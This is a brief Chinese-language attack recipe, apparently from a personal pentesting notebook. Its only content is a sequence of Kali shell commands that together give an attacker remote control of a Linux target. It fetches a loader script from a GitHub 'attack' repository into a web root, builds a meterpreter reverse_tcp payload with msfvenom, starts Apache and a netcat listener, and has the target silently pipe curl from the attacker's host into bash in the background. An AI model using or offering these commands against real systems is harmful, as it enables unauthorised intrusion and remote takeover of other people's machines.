## Loader

下载脚本到 Web 目录

```shell
┌──(root㉿kali)-[~]
└─# wget https://raw.githubusercontent.com/jadensalas469466/tools/refs/heads/main/attack/loader.sh -O /var/www/html/upload/loader.sh
```

在云服务器上生成 Payload

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=[attack_ip] LPORT=[port] -f elf -o /var/www/html/upload/payload
```

开启 Web 服务并使用 Netcat 监听 `[port]` 端口

```shell
┌──(root㉿kali)-[~]
└─# systemctl start apache2.service && nc -l -p [port]
```

使目标下载 Loader 脚本，即可上线

```shell
root@debian:~# nohup curl -fsSL http://[attack_ip]/upload/loader|bash -sh > /dev/null 2>&1 &
```

---

参考链接

- [Loader](https://github.com/jadensalas469466/tools/blob/main/attack/loader.sh)

